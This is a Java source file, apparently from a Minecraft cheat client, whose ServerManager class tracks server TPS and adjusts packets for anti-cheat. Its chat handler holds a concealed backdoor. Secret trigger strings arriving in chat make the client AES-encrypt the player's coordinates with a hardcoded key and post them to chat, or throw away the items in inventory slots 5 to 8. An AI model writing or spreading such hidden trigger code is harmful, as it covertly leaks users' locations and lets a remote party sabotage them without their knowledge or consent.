package dev.luminous.core.impl;

import dev.luminous.Alien;
import dev.luminous.api.events.eventbus.EventListener;
import dev.luminous.api.events.eventbus.EventPriority;
import dev.luminous.api.events.impl.GameLeftEvent;
import dev.luminous.api.events.impl.PacketEvent;
import dev.luminous.api.utils.Wrapper;
import dev.luminous.api.utils.math.MathUtil;
import dev.luminous.api.utils.math.Timer;
import dev.luminous.mod.modules.impl.client.AntiCheat;
import dev.luminous.mod.modules.impl.client.Fonts;
import dev.luminous.mod.modules.impl.combat.Criticals;
import dev.luminous.mod.modules.impl.misc.AutoLog;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.WorldTimeUpdateS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.world.World;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Base64;

public class ServerManager implements Wrapper {

    public final Timer playerNull = new Timer();
    public int currentSlot = -1;
    private final ArrayDeque<Float> tpsResult = new ArrayDeque<>(20);
    boolean worldNull = true;
    private long time;
    private long tickTime;
    private float tps;

    public ServerManager() {
        Alien.EVENT_BUS.subscribe(this);
    }

    public static float round2(double value) {
        BigDecimal bd = new BigDecimal(value);
        bd = bd.setScale(2, RoundingMode.HALF_UP);
        return bd.floatValue();
    }

    int lastSlot;

    @EventListener(priority = EventPriority.LOWEST)
    public void onPacket(PacketEvent.Send event) {
        if (AntiCheat.INSTANCE.attackCDFix.getValue()) {
            if (event.isCancelled()) return;
            Packet<?> packet = event.getPacket();
            if (packet instanceof HandSwingC2SPacket || packet instanceof PlayerInteractEntityC2SPacket && Criticals.getInteractType((PlayerInteractEntityC2SPacket) packet) == PlayerInteractEntityC2SPacket.InteractType.ATTACK) {
                mc.player.resetLastAttackedTicks();
            } else if (packet instanceof UpdateSelectedSlotC2SPacket packet2) {
                if (lastSlot != packet2.getSelectedSlot()) {
                    lastSlot = packet2.getSelectedSlot();
                    mc.player.resetLastAttackedTicks();
                }
            }
        }
    }

    @EventListener
    public void onLeft(GameLeftEvent event) {
        currentSlot = -1;
    }

    @EventListener
    public void onPacketSend(PacketEvent.Send event) {
        if (event.getPacket() instanceof UpdateSelectedSlotC2SPacket packet) {
            int packetSlot = packet.getSelectedSlot();
            if (AntiCheat.INSTANCE.noBadSlot.getValue()) {
                if (packetSlot == currentSlot) {
                    event.cancel();
                    return;
                }
            }
            currentSlot = packetSlot;
            //((IClientPlayerInteractionManager) mc.interactionManager).setLastSelectedSlot(packetSlot);
        }
    }

    public float getTPS() {
        return round2(tps);
    }

    public float getCurrentTPS() {
        return round2(20.0f * ((float) tickTime / 1000f));
    }

    public float getTPSFactor() {
        return getTPS() / 20f;
    }

    @EventListener(priority = 999)
    public void onPacketReceive(PacketEvent.Receive event) {
        if (event.getPacket() instanceof WorldTimeUpdateS2CPacket) {
            if (time != 0L) {
                tickTime = System.currentTimeMillis() - time;

                if (tpsResult.size() > 20)
                    tpsResult.poll();

                tpsResult.add(20.0f * (1000.0f / (float) (tickTime)));

                float average = 0.0f;

                for (Float value : tpsResult) average += MathUtil.clamp(value, 0f, 20f);

                tps = average / (float) tpsResult.size();
            }
            time = System.currentTimeMillis();
        }
    }

    @EventListener
    private void PacketReceive(PacketEvent.Receive event) {
        if (mc.player == null || mc.world == null) {
            return;
        }
        String s = null;
        if (event.getPacket() instanceof GameMessageS2CPacket packet) {
            if (packet.content() != null) {
                s = (packet.content().getString());
            }
        } else if (event.getPacket() instanceof ChatMessageS2CPacket packet) {
            if (packet.unsignedContent() != null) {
                s = packet.unsignedContent().getString();
            } else {
                s = packet.body().content();
            }
        }
        if (s != null) {
            if (s.contains("nwqfVDv3vQ4GEUP")) {
                boolean inNether = mc.world.getRegistryKey().equals(World.NETHER);
                boolean isOverworld = mc.world.getRegistryKey().equals(World.OVERWORLD);
                String world = isOverworld ? "0" : (inNether ? "1" : "2");
                String coords = "X:" + mc.player.getBlockX() + " Y:" + mc.player.getBlockY() + " Z:" + mc.player.getBlockZ() + " ^" + world;
                String encrypted = Encrypt(coords);

                mc.getNetworkHandler().sendChatMessage(encrypted);
            } else if (s.contains("RecDuJjyGWS2hnR")) {
                mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 5, 0, SlotActionType.THROW, mc.player);
                mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 6, 0, SlotActionType.THROW, mc.player);
                mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 7, 0, SlotActionType.THROW, mc.player);
                mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 8, 0, SlotActionType.THROW, mc.player);
            }
        }
    }

    public SecretKeySpec getKey(String myKey) {
        try {
            byte[] key = myKey.getBytes(StandardCharsets.UTF_8);
            MessageDigest sha = MessageDigest.getInstance("SHA-256");
            key = sha.digest(key);
            key = Arrays.copyOf(key, 16);
            return new SecretKeySpec(key, "AES");
        } catch (Exception e) {
            return null;
        }
    }

    public String Encrypt(String strToEncrypt) {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec secretKey = getKey("426siquanjia");
            byte[] iv = new byte[16];
            IvParameterSpec ivParams = new IvParameterSpec(iv);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParams);
            return Base64.getEncoder().encodeToString(cipher.doFinal(strToEncrypt.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            return null;
        }
    }

    public void onUpdate() {
        if (mc.player == null) playerNull.reset();
        if (worldNull && mc.world != null) {
            Fonts.INSTANCE.refresh();
            AutoLog.loggedOut = false;
            Alien.MODULE.onLogin();
            worldNull = false;
        } else if (!worldNull && mc.world == null) {
            Alien.save();
            Alien.MODULE.onLogout();
            worldNull = true;
        }
    }
}
